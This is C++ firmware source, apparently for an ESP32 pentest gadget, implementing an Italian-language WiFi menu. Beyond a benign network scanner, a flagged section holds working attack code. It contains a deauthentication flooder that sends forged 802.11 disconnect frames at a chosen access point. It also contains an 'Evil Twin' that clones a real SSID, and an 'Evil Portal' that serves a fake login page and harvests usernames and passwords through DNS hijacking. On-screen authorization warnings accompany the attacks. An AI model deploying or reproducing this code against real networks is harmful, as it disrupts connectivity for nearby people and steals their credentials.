#include "WifiMenu.h"

#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <algorithm>
#include <string>
#include <vector>

#include "Config.h"
#include "Display.h"
#include "Logger.h"
#include "MenuManager.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "Ui.h"

#if ENABLE_MODULE_WIFI

namespace wifi {
namespace {

struct Network {
    std::string ssid;
    std::string bssid;
    int rssi = 0;
    int channel = 1;
    int auth = 0;
};

const char* securityName(int auth) {
    switch (auth) {
        case WIFI_AUTH_OPEN:
            return "aperta";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2 Enterprise";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/WPA3";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI";
        default:
            return "sconosciuta";
    }
}

std::string shortened(const std::string& text, size_t maxLen) {
    if (text.size() <= maxLen) {
        return text;
    }
    return text.substr(0, maxLen - 1) + "~";
}

bool collectNetworks(std::vector<Network>& networks) {
    networks.clear();
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(120);

    WiFi.scanNetworks(true, true);

    uint32_t started = millis();
    uint32_t lastDraw = 0;
    navigation::waitRelease();

    while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            return false;
        }
        const uint32_t now = millis();
        if (now - lastDraw > 120) {
            const int dots = static_cast<int>((now - started) / 350) % 4;
            display::clear();
            display::header("Scansione WiFi", "WiFi");
            display::textCentered(42, "Ricerca reti in corso" + std::string(dots, '.'),
                                  display::kAccent, 2);
            display::progressBar(20, 66, 200, 8,
                                 static_cast<float>(now - started) / 6000.0f,
                                 display::kInfo);
            display::textCentered(84, "Attendi qualche secondo", display::kTextDim, 0);
            display::footer("` = annulla");
            display::push();
            lastDraw = now;
        }
        delay(40);
    }

    const int count = WiFi.scanComplete();
    if (count < 0) {
        WiFi.scanDelete();
        WiFi.mode(WIFI_OFF);
        ui::message("WiFi Scanner", {"Scansione non riuscita."}, "WiFi");
        return false;
    }

    for (int i = 0; i < count; ++i) {
        Network network;
        network.ssid = WiFi.SSID(i).c_str();
        if (network.ssid.empty()) {
            network.ssid = "(nascosta)";
        }
        network.bssid = WiFi.BSSIDstr(i).c_str();
        network.rssi = WiFi.RSSI(i);
        network.channel = WiFi.channel(i);
        network.auth = static_cast<int>(WiFi.encryptionType(i));
        networks.push_back(network);
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);

    std::sort(networks.begin(), networks.end(),
              [](const Network& a, const Network& b) { return a.rssi > b.rssi; });
    return true;
}

int chooseIndex(const std::string& title, const std::string& parent,
                const std::vector<std::string>& labels,
                const std::string& hint) {
    if (labels.empty()) {
        return -1;
    }
    constexpr int kHeaderH = 22;
    constexpr int kFooterH = 12;
    constexpr int kRowH = 20;
    const int visible =
        std::max(1, (display::height() - kHeaderH - kFooterH) / kRowH);
    int selected = 0;
    int top = 0;
    bool upHeld = false;
    bool downHeld = false;
    uint32_t nextUp = 0;
    uint32_t nextDown = 0;

    navigation::waitRelease();
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        const uint32_t now = millis();

        if (ev.type == navigation::Event::Back) {
            navigation::waitRelease();
            return -1;
        }
        if (ev.type == navigation::Event::Select) {
            navigation::waitRelease();
            return selected;
        }
        if (ev.type == navigation::Event::Up) {
            selected = (selected + static_cast<int>(labels.size()) - 1) %
                       static_cast<int>(labels.size());
        } else if (ev.type == navigation::Event::Down) {
            selected = (selected + 1) % static_cast<int>(labels.size());
        }

        const bool upNow = navigation::pressed(';');
        const bool downNow = navigation::pressed('.');
        if (upNow && !upHeld) {
            upHeld = true;
            nextUp = now + 380;
        } else if (!upNow) {
            upHeld = false;
        }
        if (downNow && !downHeld) {
            downHeld = true;
            nextDown = now + 380;
        } else if (!downNow) {
            downHeld = false;
        }
        if (upHeld && now >= nextUp) {
            selected = (selected + static_cast<int>(labels.size()) - 1) %
                       static_cast<int>(labels.size());
            nextUp = now + 110;
        }
        if (downHeld && now >= nextDown) {
            selected = (selected + 1) % static_cast<int>(labels.size());
            nextDown = now + 110;
        }

        if (selected < top) {
            top = selected;
        } else if (selected >= top + visible) {
            top = selected - visible + 1;
        }

        display::clear();
        display::header(title, parent);
        for (int row = 0; row < visible; ++row) {
            const int index = top + row;
            if (index >= static_cast<int>(labels.size())) {
                break;
            }
            const int y = kHeaderH + row * kRowH;
            const bool isSelected = index == selected;
            if (isSelected) {
                display::g().fillRoundRect(2, y + 1, display::width() - 6,
                                           kRowH - 2, 3, display::kAccentDark);
                display::g().fillRect(2, y + 6, 2, kRowH - 12,
                                      display::kAccent);
            }
            display::text(10, y + 6, shortened(labels[index], 28),
                          isSelected ? display::kWhite : display::kText, 2);
        }

        const int thumbH =
            std::max(12, visible * kRowH * visible /
                             static_cast<int>(labels.size()));
        const int trackY = kHeaderH;
        const int trackH = display::height() - kHeaderH - kFooterH;
        const int maxTop =
            std::max(1, static_cast<int>(labels.size()) - visible);
        const int thumbY =
            trackY + (trackH - thumbH) * top / maxTop;
        display::g().fillRect(display::width() - 3, trackY, 2, trackH,
                              display::kPanel);
        display::g().fillRect(display::width() - 3, thumbY, 2, thumbH,
                              display::kAccent);
        display::footer(hint);
        display::push();
        delay(16);
    }
}

void runScanner() {
    std::vector<Network> networks;
    if (!collectNetworks(networks)) {
        return;
    }
    if (networks.empty()) {
        ui::message("WiFi Scanner", {"Nessuna rete trovata."}, "WiFi");
        return;
    }

    MenuManager menu("Reti WiFi", "WiFi");
    for (const auto& network : networks) {
        std::string label =
            shortened(network.ssid, 16) + "  " + std::to_string(network.rssi) +
            "dBm" + (network.auth == WIFI_AUTH_OPEN ? "  *" : "");
        Network copy = network;
        menu.addItem(label, "wifi", [copy] {
            ui::message("Dettagli rete",
                        {"SSID: " + copy.ssid,
                         "BSSID: " + copy.bssid,
                         "Canale: " + std::to_string(copy.channel),
                         "Sicurezza: " + std::string(securityName(copy.auth)),
                         "RSSI: " + std::to_string(copy.rssi) + " dBm"},
                        "WiFi");
        });
    }
    menu.setHint("ENTER=dettagli  * = aperta  `=indietro");
    menu.run(true);
}

#if ENABLE_OFFENSIVE
bool parseBssid(const std::string& text, uint8_t out[6]) {
    int values[6] = {0};
    if (sscanf(text.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1],
               &values[2], &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        if (values[i] < 0 || values[i] > 255) {
            return false;
        }
        out[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
}

void drawDeauth(const Network& network, uint32_t packets, uint32_t remainingMs) {
    display::clear();
    display::header("Deauth WiFi", "WiFi");
    display::text(8, 30, "Target:", display::kTextDim, 0);
    display::text(8, 42, shortened(network.ssid, 28), display::kAccent, 2);
    display::text(8, 64, "BSSID " + network.bssid, display::kText, 0);
    display::text(8, 76, "Canale " + std::to_string(network.channel),
                  display::kText, 0);
    display::text(120, 76, "Frame: " + std::to_string(packets),
                  display::kText, 0);
    display::progressBar(8, 92, 180, 8,
                         1.0f - static_cast<float>(remainingMs) / 60000.0f,
                         display::kDanger);
    display::text(8, 106, "Solo reti proprie / autorizzate", display::kWarning, 0);
    display::footer("` = interrompi (max 60s)");
    display::push();
}

void runDeauth() {
    std::vector<Network> networks;
    if (!collectNetworks(networks) || networks.empty()) {
        return;
    }
    std::vector<std::string> labels;
    for (const auto& network : networks) {
        labels.push_back(shortened(network.ssid, 18) + "  ch" +
                         std::to_string(network.channel) + "  " +
                         std::to_string(network.rssi) + "dBm");
    }
    const int choice = chooseIndex("Target deauth", "WiFi", labels,
                                   "ENTER=seleziona  `=indietro");
    if (choice < 0) {
        return;
    }
    const Network target = networks[choice];

    if (!ui::legalWarning("Deauth WiFi",
                          {"Invia frame 802.11 di disconnessione.",
                           "Puo' interrompere reti e dispositivi vicini.",
                           "Solo su reti tue o con autorizzazione scritta."},
                          "WiFi")) {
        return;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(150);

    const esp_err_t promiscuous = esp_wifi_set_promiscuous(true);
    if (promiscuous != ESP_OK) {
        WiFi.mode(WIFI_OFF);
        ui::message("Deauth", {"Impossibile attivare la modalita' promiscua."},
                    "WiFi");
        return;
    }
    esp_wifi_set_channel(static_cast<uint8_t>(std::max(1, target.channel)),
                         WIFI_SECOND_CHAN_NONE);

    uint8_t bssid[6] = {0};
    if (!parseBssid(target.bssid, bssid)) {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_OFF);
        ui::message("Deauth", {"BSSID non valido."}, "WiFi");
        return;
    }

    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00,
        0x07, 0x00,
    };

    constexpr uint32_t kMaxDuration = 60000;
    const uint32_t start = millis();
    uint32_t packets = 0;
    uint32_t lastDraw = 0;
    uint32_t sequence = 0;

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        for (int i = 0; i < 5; ++i) {
            frame[22] = static_cast<uint8_t>(sequence & 0xFF);
            frame[23] = static_cast<uint8_t>((sequence >> 8) & 0x0F);
            ++sequence;
            esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
            ++packets;
            delay(4);
        }
        const uint32_t now = millis();
        if (now - lastDraw > 120) {
            drawDeauth(target, packets, kMaxDuration - (now - start));
            lastDraw = now;
        }
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    WiFi.mode(WIFI_OFF);
    logger::info("Deauth terminato: %u frame", static_cast<unsigned>(packets));
}

struct CapturedCredential {
    std::string username;
    std::string password;
};

std::vector<CapturedCredential> g_credentials;

const char kTwinHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Rete Wi-Fi</title>
<style>body{font-family:sans-serif;background:#101820;color:#eee;margin:0}
.card{max-width:420px;margin:60px auto;padding:24px;background:#1b2733;border-radius:12px}
h2{margin-top:0;color:#00d68f}small{color:#93a4b5}</style></head>
<body><div class="card"><h2>Rete Wi-Fi</h2>
<p>Connessione in manutenzione.</p>
<p><small>Ambiente di test autorizzato.</small></p></div></body></html>)HTML";

const char kPortalHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Accesso Wi-Fi</title>
<style>body{font-family:sans-serif;background:#0d1117;color:#e6edf3;margin:0}
.card{max-width:420px;margin:48px auto;padding:24px;background:#161b22;border-radius:12px}
h2{margin-top:0;color:#58a6ff}input{width:100%;box-sizing:border-box;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#238636;color:#fff;font-size:16px}
small{color:#8b949e}</style></head>
<body><div class="card"><h2>Accesso rete Wi-Fi</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Utente o email" autocomplete="off" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Accedi</button>
</form>
<p><small>Portale di test: usare solo su reti proprie o autorizzate.</small></p>
</div></body></html>)HTML";

const char kSuccessHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connessione</title></head>
<body style="font-family:sans-serif;background:#0d1117;color:#e6edf3;text-align:center;padding-top:80px">
<h2 style="color:#3fb950">Connessione in corso</h2>
<p>Attendi mentre verifichiamo i dati.</p></body></html>)HTML";

void drawAccessPoint(const std::string& title, const Network& target,
                     const IPAddress& ip, int clients, bool portal,
                     uint32_t uptimeMs) {
    display::clear();
    display::header(title, "WiFi");
    display::text(8, 30, "SSID clone:", display::kTextDim, 0);
    display::text(8, 42, shortened(target.ssid, 28), display::kAccent, 2);
    display::text(8, 64, std::string("IP portale: ") + ip.toString().c_str(),
                  display::kText, 0);
    display::text(8, 76, "Client: " + std::to_string(clients), display::kText, 0);
    if (portal) {
        display::text(120, 76,
                      "Credenziali: " + std::to_string(g_credentials.size()),
                      display::kInfo, 0);
    }
    display::text(8, 90, "Uptime: " + std::to_string(uptimeMs / 1000) + "s",
                  display::kTextDim, 0);
    display::text(8, 106, "Solo test autorizzati - dati in RAM", display::kWarning,
                  0);
    display::footer("` = interrompi AP");
    display::push();
}

void runFakeAccessPoint(const Network& target, bool portal) {
    const std::string ssid = target.ssid.empty() ? "WiFi_Test" : target.ssid;
    int channel = target.channel;
    if (channel < 1 || channel > 13) {
        channel = 6;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    delay(60);
    if (!WiFi.softAP(ssid.c_str(), nullptr, channel, 0, 4)) {
        WiFi.mode(WIFI_OFF);
        ui::message(portal ? "Evil Portal" : "Evil Twin",
                    {"Creazione access point non riuscita."}, "WiFi");
        return;
    }

    const IPAddress ip = WiFi.softAPIP();
    DNSServer dns;
    dns.start(53, "*", ip);

    AsyncWebServer server(80);
    const String redirectUrl = "http://" + ip.toString() + "/";
    if (portal) {
        server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
            request->send(200, "text/html", kPortalHtml);
        });
        server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
            CapturedCredential credential;
            if (request->hasArg("username")) {
                credential.username = request->arg("username").c_str();
            }
            if (request->hasArg("password")) {
                credential.password = request->arg("password").c_str();
            }
            if (!credential.username.empty() && g_credentials.size() < 20) {
                g_credentials.push_back(credential);
            }
            request->send(200, "text/html", kSuccessHtml);
        });
    } else {
        server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
            request->send(200, "text/html", kTwinHtml);
        });
    }
    server.onNotFound([redirectUrl](AsyncWebServerRequest* request) {
        request->redirect(redirectUrl);
    });
    server.begin();

    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    navigation::waitRelease();

    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        dns.processNextRequest();
        const uint32_t now = millis();
        if (now - lastDraw > 250) {
            drawAccessPoint(portal ? "Evil Portal" : "Evil Twin", target, ip,
                            WiFi.softAPgetStationNum(), portal, now - start);
            lastDraw = now;
        }
        delay(5);
    }

    server.end();
    dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    g_credentials.clear();
    logger::info("Access point di test chiuso");
}

void runEvilTwin() {
    std::vector<Network> networks;
    if (!collectNetworks(networks) || networks.empty()) {
        return;
    }
    std::vector<std::string> labels;
    for (const auto& network : networks) {
        labels.push_back(shortened(network.ssid, 18) + "  ch" +
                         std::to_string(network.channel) + "  " +
                         std::to_string(network.rssi) + "dBm");
    }
    const int choice = chooseIndex("SSID da clonare", "WiFi", labels,
                                   "ENTER=seleziona  `=indietro");
    if (choice < 0) {
        return;
    }
    if (!ui::legalWarning("Evil Twin",
                          {"Crea un access point con lo stesso SSID",
                           "della rete selezionata.",
                           "Solo su reti tue o con autorizzazione scritta."},
                          "WiFi")) {
        return;
    }
    g_credentials.clear();
    runFakeAccessPoint(networks[choice], false);
}

void runEvilPortal() {
    std::vector<Network> networks;
    if (!collectNetworks(networks) || networks.empty()) {
        return;
    }
    std::vector<std::string> labels;
    for (const auto& network : networks) {
        labels.push_back(shortened(network.ssid, 18) + "  ch" +
                         std::to_string(network.channel) + "  " +
                         std::to_string(network.rssi) + "dBm");
    }
    const int choice = chooseIndex("Portale: SSID da usare", "WiFi", labels,
                                   "ENTER=seleziona  `=indietro");
    if (choice < 0) {
        return;
    }
    if (!ui::legalWarning("Evil Portal",
                          {"Crea un portale web per raccogliere credenziali.",
                           "I dati restano solo in RAM e sono cancellati",
                           "all'uscita. Solo reti proprie o autorizzate."},
                          "WiFi")) {
        return;
    }
    g_credentials.clear();
    runFakeAccessPoint(networks[choice], true);
}
#endif  // ENABLE_OFFENSIVE

}  // namespace

void runMenu() {
    MenuManager menu("WiFi", "Menu principale");
    menu.addItem("Scanner reti", "scan", [] { runScanner(); });
#if ENABLE_OFFENSIVE
    menu.addSeparator("Test sicurezza (solo autorizzati)");
    menu.addItem("Deauth", "jammer", [] { runDeauth(); });
    menu.addItem("Evil Twin", "wifi", [] { runEvilTwin(); });
    menu.addItem("Evil Portal", "portal", [] { runEvilPortal(); });
#endif
    menu.setHint("`=indietro  ;.=nav  ENTER=apri");
    menu.run(true);
}

}  // namespace wifi

#endif  // ENABLE_MODULE_WIFI
